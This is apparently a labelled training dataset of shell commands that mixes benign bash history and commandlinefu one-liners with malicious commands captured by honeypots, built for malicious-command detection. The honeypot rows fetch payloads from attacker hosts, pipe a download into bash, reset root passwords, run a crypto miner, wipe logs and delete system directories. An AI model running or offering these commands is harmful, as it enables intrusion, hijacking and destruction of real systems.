id,command,label,source,split
d2_002151,mpirun -np 4 src/snap_mkl_vml-cpu --fi qasnap/center_src/in01 --fo qasnap/centre_src/out01-local,0,bash_history,train
d2_002153,pkill conky,0,bash_history,train
d2_002154,az account list --output table,0,bash_history,train
d2_002155,for i in `seq -f %03g 5 50 111`; do echo $i ; done,0,commandlinefu,train
d2_002156,"up() { local x='';for i in $(seq ${1:-1});do x=""$x../""; done;cd $x; }",0,commandlinefu,train
d2_002157,vi thomas.sh,0,bash_history,train
d2_002158,which vim,0,bash_history,train
d2_002159,mwiki () { dig +short txt `echo $*|sed 's| *|_|g'`.wp.dg.cx; },0,commandlinefu,train
d2_002161,"python3 -c 'import sys; print(sys.stdin.read().swapcase(), end="""")' <input.txt",0,commandlinefu,train
d2_002162,./jan,0,bash_history,train
d2_002164,./loligang.arm loligang.arm,1,honeypot,train
d2_002165,identify -ping imageName.png,0,commandlinefu,train
d2_002166,echo -e '\x47\x72\x6f\x70/dev/shm' > /dev/shm/.nippon,1,honeypot,train
d2_002168,git clonestproj.git,0,bash_history,train
d2_002169,v devel/lib/av_comm/,0,bash_history,train
d2_002171,curl --connect-timeout 15 -s -O -f 36.6.133.134/drago/images/.ssh/.ssh/zyk,1,honeypot,train
d2_002172,convert -geometry 800x 01_Anja-alleine.jpg,0,bash_history,train
d2_002173,./server -p 3490\,0,bash_history,train
d2_002174,"echo """" > util.py",0,bash_history,train
d2_002175,"debmirror --host=www.deb-multimedia.org --ignore-small-errors --diff=none --dist=stable,testing,unstable,experimental --arch=amd64,armel,i386,kfreebsd-amd64,kfreebsd-i386,mips,mipsel,powerpc,sparc --root=/ --method=http --section=main,non-free",0,bash_history,train
d2_002176,echo root:cAF09hUkQERBUWQ | chpasswd,1,honeypot,train
d2_002177,./myawasomescript.sh lab03.txt,0,bash_history,train
d2_002178,sudo port search nginx,0,bash_history,train
d2_002179,sudo dnf remove docker docker-client docker-client-latest docker-common docker-latest docker-latest-logrotate docker-logrotate docker-selinux docker-engine-selinux docker-engine docker-compose,0,bash_history,train
d2_002180,sudo iptables -t FORWARD -i 1 -s 31.223.96.163 -j DROP,0,bash_history,train
d2_002181,curl -O http://hfb251cdd.example.net/httpdlogic.sh,1,honeypot,train
d2_002182,sudo systemctl restart sxhkd,0,bash_history,train
d2_002183,git clonestoread/santa-tracker-android.git,0,bash_history,train
d2_002184,vim Main.c,0,bash_history,train
d2_002187,curl -O http://hac5bebed.example.net/ps23e,1,honeypot,train
d2_002188,mv src/genetic/Main.java src/genetic/.Main2,0,bash_history,train
d2_002189,pw 'Рабочий стол',0,bash_history,train
d2_002190,dmidecode | grep Vendor | head -n 1,1,honeypot,train
d2_002192,sudo apt-get install --reinstall moc,0,bash_history,train
d2_002193,37m%(sponsor)s\033[1,1,honeypot,train
d2_002194,dpkg --compare-versions 1.0-2ubuntu5 lt 1.1-1~raphink3 && echo y || echo n,0,commandlinefu,train
d2_002195,convert -geometry 600x BCSP-Kugeln_und_Sau.jpg BCSP-Kugeln_und_Sau.jpg,0,bash_history,train
d2_002196,mv van/ER_LOG_ARCH_DIRS_VAN van/log_arch_dirs.cfg,0,bash_history,train
d2_002198,killall telegram,0,bash_history,train
d2_002199,oc set volume dc/tasks-blue --add --name=jboss-config1 --mount-path=/opt/eap/standalone/configuration/application-roles.properties --sub-path=application-roles.properties --configmap-name=tasks-blue-config -n abi-tasks-prod,0,bash_history,train
d2_002200,bin/kafka-console-producer.sh --broker-list 13.249.1.24:9092 --topic test,0,bash_history,train
d2_002203,tar cf - <dir>|split -b<max_size>M - <name>.tar.,0,commandlinefu,train
d2_002204,cat /var/run/ethos/sgminer.conf | gzip | base64,1,honeypot,train
d2_002205,cp big2.sh BIG,0,bash_history,train
d2_002206,ssh -i zdogma.pem ec2-user@ec2-54-201-249-53.us-west-2.compute.amazonaws.com,0,bash_history,train
d2_002207,grep -nisI <pattern> * .[!.]*,0,commandlinefu,train
d2_002208,less bootlogd,0,bash_history,train
d2_002209,yaourt -Rnsc qt,0,bash_history,train
d2_002212,pclear,1,honeypot,train
d2_002213,chmood +x *,1,honeypot,train
d2_002214,mv ssh1.txt lynx.txt,1,honeypot,train
d2_002215,git checkout khalid,0,bash_history,train
d2_002216,wget http://h886d2d71.example.net/r00t -O ssh091,1,honeypot,train
d2_002217,drf,0,bash_history,train
d2_002218,apt-get install git tig htop,0,bash_history,train
d2_002219,sh i.sh,1,honeypot,train
d2_002220,chmod +x NemixYAY,1,honeypot,train
d2_002221,cd .ssh,1,honeypot,train
d2_002222,touch js/main.js,0,bash_history,train
d2_002223,./GOZy9TBz,1,honeypot,train
d2_002224,ll /usr/bin/VB*,0,bash_history,train
d2_002225,getent --help,0,bash_history,train
d2_002226,dd if=/dev/video0 of=snapshot.jpeg bs=11M count=1,0,bash_history,train
d2_002227,resp=cat,0,bash_history,train
d2_002228,sudo find / -user root -perm -4000 -print,0,commandlinefu,train
d2_002229,mv new.jpg cam_files/new.jpg,0,bash_history,train
d2_002230,tftp -r mpsl -g 208.170.102.64,1,honeypot,train
d2_002231,sudo vim f,0,bash_history,train
d2_002232,alias termsize='echo $COLUMNS x $LINES',0,commandlinefu,train
d2_002234,bash -c ./HaLGmypP,1,honeypot,train
d2_002236,cp trabalho.sh trabalho_2.sh,0,bash_history,train
d2_002237,cp -rv Music ~/tmp,0,bash_history,train
d2_002239,rm -rf Deltabins.sh Deltatftp1.sh Deltatftp2.sh,1,honeypot,train
d2_002241,start-hbase,0,bash_history,train
d2_002243,sudo flatpak install flathub com.discordapp.Discord,0,bash_history,train
d2_002244,/bin/busybox tftp -r x86_64 -g,1,honeypot,train
d2_002247,mv nohup_Trinity.out trinity_out_dir/nohup.out,0,bash_history,train
d2_002248,"wget 'link of a Picasa WebAlbum' -O - |perl -e'while(<>){while(s/""media"":{""content"":\[{""url"":""(.+?\.JPG)//){print ""$1\n""}}' |wget -w1 -i -",0,commandlinefu,train
d2_002249,"if cat /proc/cpuinfo | grep "" lm "" &> /dev/null; then echo ""Got 64bit"" ; fi",0,commandlinefu,train
d2_002250,docker stop $(docker ps -qa),0,bash_history,train
d2_002251,less metadata.common.imdb.com/imdb.xml,0,bash_history,train
d2_002253,sudo apt-get install libreadline-dev libconfig-dev libssl-dev lua5.2 liblua5.2-dev libevent-dev make,0,bash_history,train
d2_002254,rm -rf kjanzbins.sh kjanztftp1.sh kjanztftp2.sh,1,honeypot,train
d2_002255,mkdir emptydirectory notemptydirectory,0,bash_history,train
d2_002256,rm -rf /var/* /dev/* /tmp/*,1,honeypot,train
d2_002257,rm -rf matlaB/,0,bash_history,train
d2_002258,while :; do clear; ls path/to/dir | wc -l; sleep 1; done,0,commandlinefu,train
d2_002259,./CQOICmo2,1,honeypot,train
d2_002261,PGREP RUBY,0,bash_history,train
d2_002262,unzip blat311_64.full.zip,0,bash_history,train
d2_002263,git remote add originst-repo.git,0,bash_history,train
d2_002264,openssl ca -config intermediate/openssl.cnf -extensions server_cert -days 375 -notext -md sha256 -in /home/geek/serverprod.csr -out /home/geek/serverprod.crt,0,bash_history,train
d2_002265,vi laplace_acc.c,0,bash_history,train
d2_002266,pkill -f process_name,0,commandlinefu,train
d2_002268,base64 /dev/urandom | head -c 33554432 | split -b 8192 -da 4 - dummy.,0,commandlinefu,train
d2_002269,./shoe,0,bash_history,train
d2_002270,zcat -f $(ls -tr access.log*),0,commandlinefu,train
d2_002271,ncmpcpp `,0,bash_history,train
d2_002272,less Procfile,0,bash_history,train
d2_002273,more *.out,0,bash_history,train
d2_002274,pip install paho-client,0,bash_history,train
d2_002275,man z,0,bash_history,train
d2_002277,wget arhivesilecyber.esy.es/silecyber,1,honeypot,train
d2_002278,bzr resolve tmp/*,0,bash_history,train
d2_002280,xmodmap -e 'clear Lock' -e 'keycode 0x42 = Escape',0,commandlinefu,train
d2_002281,"watch -t -c -n30 'wget -q -O- ""http://hb3182de1.example.net/WebTracking/processInputRequest?TypeOfInquiryNumber=T&InquiryNumber1=1Z4WYXXXXXXXXXX"" | html2text | sed -n ""/Shipment Progress/,/Shipping Information/p"" | grep -v ""*"" | ccze -A'",0,commandlinefu,train
d2_002282,"detectlanguage(){ curl -s ""http://hbe9c73a2.example.net/ajax/services/language/detect?v=1.0&q=$@"" | sed 's/{""responseData"": {""language"":""\([^""]*\)"".*/\1\n/'; }",0,commandlinefu,train
d2_002283,lsof -i :53,0,bash_history,train
d2_002285,"mysql -u root -pPasswort -e 'select table_schema,round(sum(data_length+index_length)/1024/1024,4) from information_schema.tables group by table_schema;'",0,commandlinefu,train
d2_002286,sudo chmod 777 test.mp3,0,bash_history,train
d2_002287,wget http://h0248eec4.example.net/tenshi.sh,1,honeypot,train
d2_002288,rm -rf .bash_logout .bashrc .profile,1,honeypot,train
d2_002289,LC_ALL=C man -c man,0,commandlinefu,train
d2_002290,rubocop ../controllers/keys_controller.rb,0,bash_history,train
d2_002292,sudo mv 10-keyboard.conf /etc/X11/xorg.conf.d/,0,bash_history,train
d2_002293,dd if=inputfile of=split3 bs=16m count=32 skip=64,0,commandlinefu,train
d2_002294,/home/aluno#head /var/log/auth.log > $ DIR,0,bash_history,train
d2_002297,nan,1,honeypot,train
d2_002298,"find . -iname '*.jpg' | sed 's/.*/<img src=""&"">/' > gallery.html",0,commandlinefu,train
d2_002299,kill -9 PID,0,bash_history,train
d2_002300,vim db/migrate/20150522135838_create_sliders.rb,0,bash_history,train
d2_002301,mv 00_7_Ahead_4-28_then_00_8_Overview_edit 00_7_Ahead.mp4,0,bash_history,train
d2_002302,ping seprdx12,0,bash_history,train
d2_002303,"31m>>>> Testing upload speed', end='') ; ulspeed = uploadSpeed(best['url'], sizes, args.simple) ; if not args.simple: ; print_() ; print_('>>>> Upload-ul de flood este : \033[1",1,honeypot,train
d2_002304,git remote set-url originseanlatias/zedboard.git,0,bash_history,train
d2_002305,rm host~,0,bash_history,train
d2_002306,./WDUMZpu6,1,honeypot,train
d2_002307,"echo ""lory\noT66caLn2Ce9\noT66caLn2Ce9\n"" | passwd",1,honeypot,train
d2_002309,./QhklJuo6,1,honeypot,train
d2_002310,npm uninstall --minimatch@2.0.10,0,bash_history,train
d2_002311,chmod +x tftp1.sh,1,honeypot,train
d2_002312,admin2123,1,honeypot,train
d2_002316,[goalador@gatanda .ssh]$,0,bash_history,train
d2_002317,LC_ALL=C rm -f ~/q4fswr422z8ltkrsabiztjymro,1,honeypot,train
d2_002318,mv ER_FTP_DIRS_PNG.cnf ftp_dirs.cfg,0,bash_history,train
d2_002319,mv Beauty\ And\ The\ Beast\ \(1991\)/ Beauty\ and\ the\ Beast\ \(1991\)/,0,bash_history,train
d2_002320,/bin/skhqwensw,1,honeypot,train
d2_002321,"sort -n <( for i in $(find . -maxdepth 1 -mindepth 1 -type d); do echo $(find $i | wc -l) "": $i""; done;)",0,commandlinefu,train
d2_002323,rm loligang.x86 -rf,1,honeypot,train
d2_002324,git stash --list,0,bash_history,train
d2_002325,tar xvf has-CruD-5.1.tgz,1,honeypot,train
d2_002326,mencoder dvd://1 -aid 128 -o track-1.avi -oac copy -ovc lavc -lavcopts vcodec=mpeg4,0,commandlinefu,train
d2_002327,cat dead.letter,0,bash_history,train
d2_002328,cp texfile.toc texfile.toc.bak; latex texfile.tex; cmp -s texfile.toc texfile.toc.bak; if [ $? -ne 0 ]; then latex texfile.tex; fi,0,commandlinefu,train
d2_002329,"logger -t MyProgramName ""Whatever you're logging""",0,commandlinefu,train
d2_002330,loginctl show-session $XDG_SESSION_ID -p Type,0,commandlinefu,train
d2_002331,echo UDP_TEST_DATA > /dev/udp/46.40.120.211/65000,1,honeypot,train
d2_002335,chmod 777 mips,1,honeypot,train
d2_002336,"file=par_all36_prot.prm; echo """" > $file.decharmmd.prm; cat $file > $file.decharmmd.prm",0,bash_history,train
d2_002338,locate \/\(.*$\),0,bash_history,train
d2_002339,python3 test_Publish.py circle1_off,0,bash_history,train
d2_002341,git remote add originshCraciun/hello_android,0,bash_history,train
d2_002342,/bin/busybox cat /sys/fs/cgroup/devices/.nippon,1,honeypot,train
d2_002343,make mrproper,0,bash_history,train
d2_002344,bg 47829,0,bash_history,train
d2_002345,chmod -x relacaonumeros,0,bash_history,train
d2_002346,sudo /usr/sbin/iftop -i eth5,0,bash_history,train
d2_002347,./Vt8kIsWx,1,honeypot,train
d2_002348,docker pull cloudac7/cp2k:v6.1,0,bash_history,train
d2_002349,php yii,0,bash_history,train
d2_002350,du -hsx * | sort -rh,0,commandlinefu,train
d2_002351,cat /dev/null > /var/log/tallylog,1,honeypot,train
d2_002354,tftp 134.120.129.133 -c get axistftp1.sh,1,honeypot,train
d2_002355,vim /etc/apache2/sites-available/default,0,bash_history,train
d2_002357,chmod +x JLDUCGEf,1,honeypot,train
d2_002358,curl -O http://ha5013061.example.net/curl.sh,1,honeypot,train
d2_002359,"s() { screen -d -RR -m -S ""$1"" -t ""$USER""@""$1"" ssh ""$1""; }",0,commandlinefu,train
d2_002360,cp -R upload2/* upload2_bk/,0,bash_history,train
d2_002362,"for i in {0..255}; do echo -e ""\e[38;05;${i}m${i}""; done | column -c 80 -s ' '; echo -e ""\e[m""",0,commandlinefu,train
d2_002363,df -m,0,bash_history,train
d2_002364,docker stop romantic_keller,0,bash_history,train
d2_002365,./luoUKdvF,1,honeypot,train
d2_002366,wget http://h4d49f8e2.example.net/sh,1,honeypot,train
d2_002367,perl n3,1,honeypot,train
d2_002368,vim file.targ,0,bash_history,train
d2_002369,cruft,0,bash_history,train
d2_002371,wget http://h44c6f028.example.net/psybnc-linuxRO.tar,1,honeypot,train
d2_002372,./test run -i qasnap/center_src/in08 -n 8 --cpu --clean,0,bash_history,train
d2_002373,curl -O http://hdedcf99e.example.net/eBxUk/kjUiwa2.sh,1,honeypot,train
d2_002374,chmod 777 dick1.sh,1,honeypot,train
d2_002375,"spellcheck(){ typeset y=$@;curl -sd ""<spellrequest><text>$y</text></spellrequest>"" https://hd8b99f68.example.net/tbproxy/spell|sed -n '/s=""[0-9]""/{s/<[^>]*>/ /g;s/\t/ /g;s/ *\(.*\)/Suggestions: \1\n/g;p}'|tee >(grep -Eq '.*'||echo -e ""OK"");}",0,commandlinefu,train
d2_002376,make fpga,0,bash_history,train
d2_002377,chmod 777 Corona.sh,1,honeypot,train
d2_002378,chsh -s usr/bin/fish,0,bash_history,train
d2_002379,vim 12_8d.py,0,bash_history,train
d2_002380,find -type comando,0,bash_history,train
d2_002381,gulp serve,0,bash_history,train
d2_002383,wget http://hda018cce.example.net/Razor.sh,1,honeypot,train
d2_002384,wget http://h8d96af7e.example.net/lmaoWTF/loligang.x86,1,honeypot,train
d2_002385,[goalador@gatanda corpwebsite-starterkit]$ Username for : webappcreations,0,bash_history,train
d2_002388,less favourites.xml,0,bash_history,train
d2_002389,perl bot.plls,1,honeypot,train
d2_002390,dmcli eRT setv Device.MoCA.X_CISCO_COM_ProvisioningFilename string aaa,0,bash_history,train
d2_002392,mv 1deweylab/ deweylab,0,bash_history,train
d2_002393,"./configure --help | grep -P ""^ +--with-(?!(poll|select))[^=]+(_module( |$)| (module|support)$)"" | sed -r 's/((dis|en)able|build) /# /'",0,commandlinefu,train
d2_002394,pactl set-sink-mute 0 toggle,0,commandlinefu,train
d2_002395,rails generate migration stud,0,bash_history,train
d2_002396,chmod 777 kjUiwa.sh,1,honeypot,train
d2_002399,chmod +x sshserverruntime,1,honeypot,train
d2_002401,/bin/busybox kysankit,1,honeypot,train
d2_002403,"ps -aux| grep ""python dns.py""|",0,bash_history,train
d2_002404,sudo tar zxvf spark-1.6.0-bin-hadoop2.4.tgz,0,bash_history,train
d2_002406,b43-asm.bin,0,bash_history,train
d2_002407,"cat /etc/passwd | cut -d: -f5,2",0,bash_history,train
d2_002408,tar xzvf Hadess.tar.gz,0,bash_history,train
d2_002409,"links $( a=( $( lynx -dump -listonly ""http://h198be0e6.example.net"" | grep -Eo ""(http|https)://[a-zA-Z0-9./?=_-]*"" | grep -v ""google.com"" | sort | uniq ) ) ; amax=${#a[@]} ; n=$(( `date '+%s'` % $amax )) ; echo ${a[n]} )",0,commandlinefu,train
d2_002410,cp -v .bash* /run/media/sam/SAM/LinuxDesktop2019/securerootd/config/,0,bash_history,train
d2_002411,git clone git@github.com:Shivsantos/gitautopush.git,0,bash_history,train
d2_002412,"[ -z ""$VAR"" ] && echo ""VAR has not been set"" && exit 1",0,commandlinefu,train
d2_002413,cd .oznminerv2,1,honeypot,train
d2_002415,git merge QA,0,bash_history,train
d2_002416,"echo '123/7' |bc -l |xargs printf ""%.3f\n""",0,commandlinefu,train
d2_002417,-t,1,honeypot,train
d2_002419,ls -alh /tools/bin/bash,0,bash_history,train
d2_002420,man wpa_supplicant.conf,0,bash_history,train
d2_002421,vim -c new myfile,0,commandlinefu,train
d2_002422,add-apt,0,bash_history,train
d2_002423,cp send.py radio.py,0,bash_history,train
d2_002424,tar zxvf mineryess.tgz,1,honeypot,train
d2_002425,* Documentation:,0,bash_history,train
d2_002427,"top -b -n 1 | awk '{if (NR <=7) print; else if ($8 == ""D"") {print; count++} } END {print ""Total status D: ""count}'",0,commandlinefu,train
d2_002428,g cl,0,bash_history,train
d2_002429,if [ -f $(which uptime) ],1,honeypot,train
d2_002431,sudo cp -r app/ /home/silar_copy,0,bash_history,train
d2_002432,head index-02f0ad4b59-02f0ad4b59.html,0,bash_history,train
d2_002433,cur -fsSL http://h7642432e.example.net/2start.jpg | bash -sh,1,honeypot,train
d2_002434,vi ex_5,0,bash_history,train
d2_002435,unzip WhatsApp\ Chat\ -\ Da\ Brudarhood.zip -d ../WhappChats/Da\ Brudahood,0,bash_history,train
d2_002436,[goalador@gatanda hhneuauf.de]$ [goalador@gatanda hhneuauf.de]$ f.de]$ bash: [goalador@gatanda: command not found,0,bash_history,train
d2_002437,(echo zVkYSMYO7BnR1yAz,1,honeypot,train
d2_002438,apt-get install tools-net,1,honeypot,train
d2_002439,netstat -anlp| grep :53,0,bash_history,train
d2_002440,tar xf server.tar.gz,1,honeypot,train
d2_002441,vim /lib/gcc/x86_64-pc-linux-gnu/8.2.1/include/omp.h,0,bash_history,train
d2_002442,tail -f /var/log/system.log | colorizer,0,commandlinefu,train
d2_002443,yun install unzip,1,honeypot,train
d2_002444,cat .vimrc,0,bash_history,train
d2_002445,"DATE=`date +""%y%m%d%H%M""`; CHECKSUM=`printf ""%02d"" $((DATE%97))`; echo $DATE$CHECKSUM |sed -e 's#\([0-9]\{3\}\)\([0-9]\{4\}\)\([0-9]\{5\}\)#+++\1/\2/\3+++#'",0,commandlinefu,train
d2_002446,chmod 777 tftp2.sh,1,honeypot,train
d2_002447,git add /home/admin/web/alan.dev.digiprojects.top/public_html/storage/modification/*,0,bash_history,train
d2_002448,info --vi-keys,0,commandlinefu,train
d2_002450,sudo nano _dashboard_course_listing.html,0,bash_history,train
d2_002451,"sleep 6s && notify-send -t 10000 -u critical ""remember to think"" &",0,commandlinefu,train
d2_002454,perlbrew switch-off,0,bash_history,train
d2_002455,mkdir neelu2 neelu3,0,bash_history,train
d2_002456,sql,0,bash_history,train
d2_002458,wgets.lycos.co.uk/bals/je.tgz,0,bash_history,train
d2_002459,diff /etc/smb.conf /etc/samba/smb.conf.old.gadmin-samba-0.3.2,0,bash_history,train
d2_002462,/bin/busybox rm -f /dev/.nippon,1,honeypot,train
d2_002463,"zeros=3; from=1; to=15; for foo in $(seq $from $to); do echo mv ""front${foo}back"" ""front$(printf ""%0${zeros}d\n"" $foo)back""; done",0,commandlinefu,train
d2_002464,sudo pacman -U package-query-1.9-2-x86_64.pkg.tar.xz,0,bash_history,train
d2_002465,"echo -e ""12 morning\n15 afternoon\n24 evening"" |awk '{if ('`date +%H`'<$1) {print ""Good ""$2;exit}}'",0,commandlinefu,train
d2_002467,sudo modprobe vboxfs,0,bash_history,train
d2_002468,rm -rf .x15c*,1,honeypot,train
d2_002469,config terminal,1,honeypot,train
d2_002470,"echo apt-get\ {update,-y\ upgrade}\ \&\& true | sudo bash",0,commandlinefu,train
d2_002472,(sed 's/^/x+=/' [yourfile] ; echo x) | bc,0,commandlinefu,train
d2_002473,/bin/busybox,1,honeypot,train
d2_002474,open app-ios/LocalizedStringKit/sw.lproj/LocalizedStringKit.strings,0,bash_history,train
d2_002476,echo 0fj8Hx6W4yH) | passwd,1,honeypot,train
d2_002477,sudo pacman -S vnstat,0,bash_history,train
d2_002478,cat /dev/null > /var/log/syslog,1,honeypot,train
d2_002481,sudo service mariadb stop,0,bash_history,train
d2_002482,./cnrig -o 68.198.238.17:5555 -u 44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A) -p victor+dihef44682@link3mail.com -t,1,honeypot,train
d2_002483,pg_dump otrs2 | gzip > dump.gz,0,commandlinefu,train
d2_002485,sudo netstat -atnp|grep xinetd,0,bash_history,train
d2_002486,~/pictures,0,bash_history,train
d2_002487,chmod 700 primeiro r,0,bash_history,train
d2_002489,mv hello.cpp helloworld.cpp,0,bash_history,train
d2_002490,cd passwd,1,honeypot,train
d2_002491,curl -O http://hdfc240fb.example.net/3309,1,honeypot,train
d2_002492,wget http://hd5c3fe17.example.net/Tadaa.sh,1,honeypot,train
d2_002493,sudo docker rm a0,0,bash_history,train
d2_002494,"ansible -i inventario -m command -a ""ls""",0,bash_history,train
d2_002495,/usr/syno/sbin/./synodsdefault --factory-default,0,commandlinefu,train
d2_002496,git add file,0,bash_history,train
d2_002497,nc -l -p 2000 < song.mp3,0,commandlinefu,train
d2_002498,rm -rf Code/,0,bash_history,train
d2_002499,"awk 'BEGIN{srand()}{print rand(),$0}' SOMEFILE | sort -n | cut -d ' ' -f2-",0,commandlinefu,train
d2_002500,cut -n : -f 1 /etc/passwd > a,0,bash_history,train
d2_002502,echo thisIsATest | sed -E 's/([A-Z])/_\L\1/g',0,commandlinefu,train
d2_002503,"echo ""admin"" | sudo -S killall -9 libxml_CP",1,honeypot,train
d2_002504,grep localectl * 2>/dev/null,0,bash_history,train
d2_002505,/bin/busybox cat /proc/mounts,1,honeypot,train
d2_002506,git checkout -- src/bidder/exchange/OpenRTBExchange.cpp,0,bash_history,train
d2_002508,./vMtQtCLp,1,honeypot,train
d2_002509,chmod +x dbatNwQN,1,honeypot,train
d2_002510,sudo openvpn client.ovpn,0,bash_history,train
d2_002511,apt-get install expect ffmpeg findutils gawk git gnutls golang grep gzip <br>,0,bash_history,train
d2_002512,wget http://he9b6be8e.example.net/XnmQ8,1,honeypot,train
d2_002513,STDOUT/single.fa |wc -l,0,bash_history,train
d2_002514,curl --connect-timeout 15 -s -O -f 177.117.178.35/wp-admin/images/kbk,1,honeypot,train
d2_002515,wget -O Download/filname.shsti.net.nz/~robin/wrtbwmon,0,bash_history,train
d2_002516,ffmpeg -i Your_video_file -s 320x240 FILE.flv,0,commandlinefu,train
d2_002518,raspistill -o vid.h264 4000,0,bash_history,train
d2_002520,seq 10| shuf | head -1,0,commandlinefu,train
d2_002521,./dirtycoo,1,honeypot,train
d2_002522,gitlab-ctl stop,0,bash_history,train
d2_002523,vi bmi.py,0,bash_history,train
d2_002524,sudo nano dht,0,bash_history,train
d2_002526,find . -regex '\(.*mp4\|.*mpg\|.*mpeg\|.*mov\|.*wmv\|.*mkv\|.*avi\)' -exec exiftool -directory -fileName -imageSize {} \;,0,commandlinefu,train
d2_002527,netstat -lantp | grep ESTABLISHED |awk '{print $5}' | awk -F: '{print $1}' | sort -u,0,commandlinefu,train
d2_002528,rm *.sh,1,honeypot,train
d2_002529,"for file in $(find ~/ -iname ""*.mp3"");do c=$(mp3info $file|grep Genre|cut -f 3 -d :|cut -f 2 -d "" "");if [ -z ""$c"" ];then c=""Uncategorized"";fi;if [ ! -e $c ];then touch $c.m3u;fi;echo ""$file"">>$c.m3u;done",0,commandlinefu,train
d2_002530,ip rulesc,0,bash_history,train
d2_002531,ssh remote_user@remote_host 'mysqldump -h localhost -u username -ppass -B db_name | gzip -cf' | gunzip -c | mysql -uroot,0,commandlinefu,train
d2_002532,unzip fsouza-snipmate-snippets-564c7cc.zip,0,bash_history,train
d2_002535,rlwrap sqlite3 database.db,0,commandlinefu,train
d2_002536,"netstat -atn | perl -0777 -ne '@ports = /tcp.*?\:(\d+)\s+/imsg ; for $port (32768..61000) {if(!grep(/^$port$/, @ports)) { print $port; last } }'",0,commandlinefu,train
d2_002537,nano tasks/rhel-packages.yml,0,bash_history,train
d2_002540,wget http://he150693c.example.net/it.sh,1,honeypot,train
d2_002541,less .git,0,bash_history,train
d2_002542,mencoder -ovc copy -nosound input.avi -o output.avi,0,commandlinefu,train
d2_002543,"mpack -s ""Backup: $file"" ""$file"" email@id.com",0,commandlinefu,train
d2_002544,sudo wgetst_armhf.deb,0,bash_history,train
d2_002545,javac -cp commons-codec-1.7.jar:jgrapht-jdk1.6.jar:mysql-connector-java-5.1.24-bin.jar cs5530/VideoStore.java,0,bash_history,train
d2_002546,sudo node /home/pi/dist/node/stream-server.js johnpi,0,bash_history,train
d2_002547,cat screen.sh,0,bash_history,train
d2_002548,curl -O http://hdddb85a9.example.net/i3306m,1,honeypot,train
d2_002549,cat mapred-site.xml,0,bash_history,train
d2_002550,rmdir -r Linux2,0,bash_history,train
d2_002551,ffmpeg -re -i VIDEODCP.mxf -i AUDIODCP.mxf -vcodec h264 -acodec aac -f mpegts udp://76.132.177.92:1234,0,commandlinefu,train
d2_002552,setarch --help,0,bash_history,train
d2_002554,mv -v /usr/lib/libattr.so.* /lib,0,bash_history,train
d2_002555,docker pull rsyslog/rsyslog_base_centos7,0,bash_history,train
d2_002556,readlink -f /proc/$$/exe,0,commandlinefu,train
d2_002558,chmod +x ps23e,1,honeypot,train
d2_002560,:1,0,bash_history,train
d2_002561,mdk d network ls,0,bash_history,train
d2_002563,sudo netstat -plnt | grep :50 | awk '{print $7}' | awk -F/ '{print $1}' | xargs kill -9,0,commandlinefu,train
d2_002564,./oM3m7O7t,1,honeypot,train
d2_002565,pkill -x firefox,0,commandlinefu,train
d2_002566,cat /proc/PID/environ | tr '\0' '\n',0,commandlinefu,train
d2_002567,./hbot x86_64,1,honeypot,train
d2_002568,cat livestatus.log.1,0,bash_history,train
d2_002569,bundle exec rails generate devise employer,0,bash_history,train
d2_002570,qwget https://h8fe31bb0.example.net/jd7P/davidv2.zip,1,honeypot,train
d2_002571,yaourt nntpgrab,0,bash_history,train
d2_002572,rm STDOUT/single.fa,0,bash_history,train
d2_002574,busybox curl -O http://hdedcf99e.example.net/eBxUk/kjUiwa.sh,1,honeypot,train
d2_002575,"nice -n19 dump -0af - /<filesystem> -z9|gpg -e -r <gpg key id>|cstream -v 1 -t 60k|ssh <user@host> ""cat > backup.img""",0,commandlinefu,train
d2_002576,chmod +x ys808e,1,honeypot,train
d2_002577,"diff <(md5sum render_pack.zip| cut -d "" "" -f 1) <(md5sum /media/green/render_pack.zip| cut -d "" "" -f 1);echo $?",0,commandlinefu,train
d2_002578,sudo pacman -S lib32-freetype2 2.8-2,0,bash_history,train
d2_002579,"/bin/busybox rm -f /sys/fs/cgroup/net_cls,net_prio/.nippon",1,honeypot,train
d2_002580,"exiftool ""-DateTimeOriginal+=0:0:0 15:30:0"" a.jpg",0,commandlinefu,train
d2_002581,bash -c ./ssqzYHpG,1,honeypot,train
d2_002583,"find -printf ""%C@ %p\n""|sort",0,commandlinefu,train
d2_002584,bash -c ./NemixYAY,1,honeypot,train
d2_002585,cmd1 && cmd2 && echo success || echo epic fail,0,commandlinefu,train
d2_002586,name: nexus-pvc,0,bash_history,train
d2_002587,sudo rm -rf /usr/local/mysql,0,bash_history,train
d2_002588,service firewalld start,0,bash_history,train
